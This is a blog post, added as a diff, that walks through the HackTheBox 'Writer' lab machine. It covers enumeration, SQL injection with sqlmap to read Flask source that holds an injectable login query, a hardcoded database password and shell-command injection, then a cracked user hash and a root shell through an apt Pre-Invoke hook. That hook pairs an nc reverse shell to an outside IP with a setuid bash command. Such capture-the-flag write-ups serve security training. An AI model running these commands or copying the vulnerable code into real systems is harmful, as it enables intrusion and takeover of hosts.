@@ -1,0 +1,428 @@
+---
+layout: post
+title:  "HackTheBox - Writer"
+date:   2021-08-03 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
+|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
+|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Story Bank | Writer.HTB
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: -1s
+| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   WRITER<00>           Flags: <unique><active>
+|   WRITER<03>           Flags: <unique><active>
+|   WRITER<20>           Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-01T17:00:51
+|_  start_date: N/A
+```
+```
+/contact              (Status: 200) [Size: 4905]
+/about                (Status: 200) [Size: 3522]
+/static               (Status: 301) [Size: 315] [--> http://10.129.151.44/static/]
+/logout               (Status: 302) [Size: 208] [--> http://10.129.151.44/]       
+/dashboard            (Status: 302) [Size: 208] [--> http://10.129.151.44/]       
+/administrative       (Status: 200) [Size: 1443]
+```
+```s
+──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ smbclient -L \\\\10.129.151.44\\ 
+Enter WORKGROUP\kali's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	writer2_project Disk      
+	IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+```
+Ran sqlmap with the login request at /administrative and got a hash , but just wasn't able to crack it.
+After that we try reading files via sqlmap. And a lot of searching later we try this :
+
+```s
+sqlmap -r requests.txt  --privileges --file-read=/var/www/writer.htb/writer/__init__.py --time-sec=10
+```
+This is the file we get:
+
+```py
+from flask import Flask, session, redirect, url_for, request, render_template
+from mysql.connector import errorcode
+import mysql.connector
+import urllib.request
+import os
+import PIL
+from PIL import Image, UnidentifiedImageError
+import hashlib
+
+app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')
+
+#Define connection for database
+def connections():
+    try:
+        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
+        return connector
+    except mysql.connector.Error as err:
+        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
+            return ("Something is wrong with your db user name or password!")
+        elif err.errno == errorcode.ER_BAD_DB_ERROR:
+            return ("Database does not exist")
+        else:
+            return ("Another exception, returning!")
+    else:
+        print ('Connection to DB is ready!')
+
+#Define homepage
+@app.route('/')
+def home_page():
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+            return ("Database error")
+    cursor = connector.cursor()
+    sql_command = "SELECT * FROM stories;"
+    cursor.execute(sql_command)
+    results = cursor.fetchall()
+    return render_template('blog/blog.html', results=results)
+
+#Define about page
+@app.route('/about')
+def about():
+    return render_template('blog/about.html')
+
+#Define contact page
+@app.route('/contact')
+def contact():
+    return render_template('blog/contact.html')
+
+#Define blog posts
+@app.route('/blog/post/<id>', methods=['GET'])
+def blog_post(id):
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+            return ("Database error")
+    cursor = connector.cursor()
+    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
+    results = cursor.fetchall()
+    sql_command = "SELECT * FROM stories;"
+    cursor.execute(sql_command)
+    stories = cursor.fetchall()
+    return render_template('blog/blog-single.html', results=results, stories=stories)
+
+#Define dashboard for authenticated users
+@app.route('/dashboard')
+def dashboard():
+    if not ('user' in session):
+        return redirect('/')
+    return render_template('dashboard.html')
+
+#Define stories page for dashboard and edit/delete pages
+@app.route('/dashboard/stories')
+def stories():
+    if not ('user' in session):
+        return redirect('/')
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+            return ("Database error")
+    cursor = connector.cursor()
+    sql_command = "Select * From stories;"
+    cursor.execute(sql_command)
+    results = cursor.fetchall()
+    return render_template('stories.html', results=results)
+
+@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
+def add_story():
+    if not ('user' in session):
+        return redirect('/')
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+            return ("Database error")
+    if request.method == "POST":
+        if request.files['image']:
+            image = request.files['image']
+            if ".jpg" in image.filename:
+                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
+                image.save(path)
+                image = "/img/{}".format(image.filename)
+            else:
+                error = "File extensions must be in .jpg!"
+                return render_template('add.html', error=error)
+
+        if request.form.get('image_url'):
+            image_url = request.form.get('image_url')
+            if ".jpg" in image_url:
+                try:
+                    local_filename, headers = urllib.request.urlretrieve(image_url)
+                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
+                    image = "{}.jpg".format(local_filename)
+                    try:
+                        im = Image.open(image) 
+                        im.verify()
+                        im.close()
+                        image = image.replace('/tmp/','')
+                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
+                        image = "/img/{}".format(image)
+                    except PIL.UnidentifiedImageError:
+                        os.system("rm {}".format(image))
+                        error = "Not a valid image file!"
+                        return render_template('add.html', error=error)
+                except:
+                    error = "Issue uploading picture"
+                    return render_template('add.html', error=error)
+            else:
+                error = "File extensions must be in .jpg!"
+                return render_template('add.html', error=error)
+        author = request.form.get('author')
+        title = request.form.get('title')
+        tagline = request.form.get('tagline')
+        content = request.form.get('content')
+        cursor = connector.cursor()
+        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
+        result = connector.commit()
+        return redirect('/dashboard/stories')
+    else:
+        return render_template('add.html')
+
+@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
+def edit_story(id):
+    if not ('user' in session):
+        return redirect('/')
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+            return ("Database error")
+    if request.method == "POST":
+        cursor = connector.cursor()
+        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
+        results = cursor.fetchall()
+        if request.files['image']:
+            image = request.files['image']
+            if ".jpg" in image.filename:
+                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
+                image.save(path)
+                image = "/img/{}".format(image.filename)
+                cursor = connector.cursor()
+                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
+                result = connector.commit()
+            else:
+                error = "File extensions must be in .jpg!"
+                return render_template('edit.html', error=error, results=results, id=id)
+        if request.form.get('image_url'):
+            image_url = request.form.get('image_url')
+            if ".jpg" in image_url:
+                try:
+                    local_filename, headers = urllib.request.urlretrieve(image_url)
+                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
+                    image = "{}.jpg".format(local_filename)
+                    try:
+                        im = Image.open(image) 
+                        im.verify()
+                        im.close()
+                        image = image.replace('/tmp/','')
+                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
+                        image = "/img/{}".format(image)
+                        cursor = connector.cursor()
+                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
+                        result = connector.commit()
+
+                    except PIL.UnidentifiedImageError:
+                        os.system("rm {}".format(image))
+                        error = "Not a valid image file!"
+                        return render_template('edit.html', error=error, results=results, id=id)
+                except:
+                    error = "Issue uploading picture"
+                    return render_template('edit.html', error=error, results=results, id=id)
+            else:
+                error = "File extensions must be in .jpg!"
+                return render_template('edit.html', error=error, results=results, id=id)
+        title = request.form.get('title')
+        tagline = request.form.get('tagline')
+        content = request.form.get('content')
+        cursor = connector.cursor()
+        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
+        result = connector.commit()
+        return redirect('/dashboard/stories')
+
+    else:
+        cursor = connector.cursor()
+        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
+        results = cursor.fetchall()
+        return render_template('edit.html', results=results, id=id)
+
+@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
+def delete_story(id):
+    if not ('user' in session):
+        return redirect('/')
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+            return ("Database error")
+    if request.method == "POST":
+        cursor = connector.cursor()
+        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
+        result = connector.commit()
+        return redirect('/dashboard/stories')
+    else:
+        cursor = connector.cursor()
+        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
+        results = cursor.fetchall()
+        return render_template('delete.html', results=results, id=id)
+
+#Define user page for dashboard
+@app.route('/dashboard/users')
+def users():
+    if not ('user' in session):
+        return redirect('/')
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+        return "Database Error"
+    cursor = connector.cursor()
+    sql_command = "SELECT * FROM users;"
+    cursor.execute(sql_command)
+    results = cursor.fetchall()
+    return render_template('users.html', results=results)
+
+#Define settings page
+@app.route('/dashboard/settings', methods=['GET'])
+def settings():
+    if not ('user' in session):
+        return redirect('/')
+    try:
+        connector = connections()
+    except mysql.connector.Error as err:
+        return "Database Error!"
+    cursor = connector.cursor()
+    sql_command = "SELECT * FROM site WHERE id = 1"
+    cursor.execute(sql_command)
+    results = cursor.fetchall()
+    return render_template('settings.html', results=results)
+
+#Define authentication mechanism
+@app.route('/administrative', methods=['POST', 'GET'])
+def login_page():
+    if ('user' in session):
+        return redirect('/dashboard')
+    if request.method == "POST":
+        username = request.form.get('uname')
+        password = request.form.get('password')
+        password = hashlib.md5(password.encode('utf-8')).hexdigest()
+        try:
+            connector = connections()
+        except mysql.connector.Error as err:
+            return ("Database error")
+        try:
+            cursor = connector.cursor()
+            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
+            cursor.execute(sql_command)
+            results = cursor.fetchall()
+            for result in results:
+                print("Got result")
+            if result and len(result) != 0:
+                session['user'] = username
+                return render_template('success.html', results=results)
+            else:
+                error = "Incorrect credentials supplied"
+                return render_template('login.html', error=error)
+        except:
+            error = "Incorrect credentials supplied"
+            return render_template('login.html', error=error)
+    else:
+        return render_template('login.html')
+
+@app.route("/logout")
+def logout():
+    if not ('user' in session):
+        return redirect('/')
+    session.pop('user')
+    return redirect('/')
+
+if __name__ == '__main__':
+   app.run("0.0.0.0")
+   ```
+
+# FOOTHOLD
+
+Got into smb with creds and got a hash of user kyle.
+
+```
+pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
+```
+cracked with hashcat and finally into ssh :)
+
+# PRIVILEGE ESCALATION
+
+We find a file named disclaimer in the home directory of kyle user. Further we see that smtp is also running.
+[smtp reverse-shell via netcat](https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish)
+[smtp via python](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
+
+So we put in out reverse shell in disclaimer and we edit the python script accordingly and run it to get a shell back . Stabilise the shell using socat.
+
+Now we are user john.
+
+```s
+john@writer:/home/kyle$ id
+uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
+john@writer:/home/kyle$ find / -group management 2>/dev/null
+/etc/apt/apt.conf.d
+john@writer:/home/kyle$ cd /etc/apt
+john@writer:/etc/apt$ ls
+apt.conf.d   preferences.d  sources.list.curtin.old  trusted.gpg.d
+auth.conf.d  sources.list   sources.list.d
+john@writer:/etc/apt$ cd apt.conf.d
+john@writer:/etc/apt/apt.conf.d$ ls
+01autoremove      15update-stamp  20snapd.conf         99update-notifier
+01-vendor-ubuntu  20archive       50command-not-found
+10periodic        20packagekit    70debconf
+```
+
+We also notice one stuff in pspy64s that root user keeps running apt update. So we searched a way to escalate our privileges using apt update.
+[privesc using apt update](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)
+
+```s
+john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.149 1234 >/tmp/f"};' > pwn
+john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"chmod +s /bin/bash"};' >> pwn
+john@writer:/etc/apt/apt.conf.d$ cat pwn
+apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.149 1234 >/tmp/f"};
+apt::Update::Pre-Invoke {"chmod +s /bin/bash"};
+```
+Now as soon as root runs the apt update command, we get a reverse shell back :)
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.149] from (UNKNOWN) [10.129.152.36] 34078
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cd /root
+# cat root.txt
+```
+
+
